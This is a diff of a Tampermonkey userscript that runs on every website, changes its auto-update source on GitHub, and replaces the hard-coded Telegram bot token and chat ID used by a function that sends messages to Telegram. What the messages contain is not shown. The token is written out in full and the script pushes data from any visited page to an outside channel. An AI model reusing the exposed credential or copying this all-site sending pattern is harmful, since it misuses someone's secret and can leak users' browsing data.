@@ -3,8 +3,8 @@
 // @namespace    http://tampermonkey.net/
 // @version      4.0
 // @description  try to take over the world!
-// @updateURL    https://raw.githubusercontent.com/anisnurcahyo6/E11RRD33K44B00/refs/heads/main/Andalan/Andalan1.js
-// @downloadURL  https://raw.githubusercontent.com/anisnurcahyo6/E11RRD33K44B00/refs/heads/main/Andalan/Andalan1.js
+// @updateURL    https://raw.githubusercontent.com/anisnurcahyo6/E11RRD33K44B00/refs/heads/main/Andalan/Andalan4.js
+// @downloadURL  https://raw.githubusercontent.com/anisnurcahyo6/E11RRD33K44B00/refs/heads/main/Andalan/Andalan4.js
 // @author       You
 // @match        http*://*/*
 // @run-at       document-end
@@ -957,8 +957,8 @@ function levenshtein(a, b) {
 
 // Kirim ke Telegram, dengan deteksi spam berbasis kemiripan
 async function sendToTelegram(message) {
-    var TELEGRAM_TOKEN = '83370:AAHblTLr220NEd9PwS7Bzzcxix9RK8'; // GANTI
-    var TELEGRAM_CHAT_ID = '-1002725'; // GANTI
+var TELEGRAM_TOKEN = '8239130398:AAHZVA0z5h7c2Pi_mRWlzYFojILVoylDP8I'; // GANTI
+var TELEGRAM_CHAT_ID = '-1002785071277'; // GANTI
     if (sudahkirim) return;
     sudahkirim = true
     const fullMessage = `? [${SCRIPT_NAME}]\n${message}`;
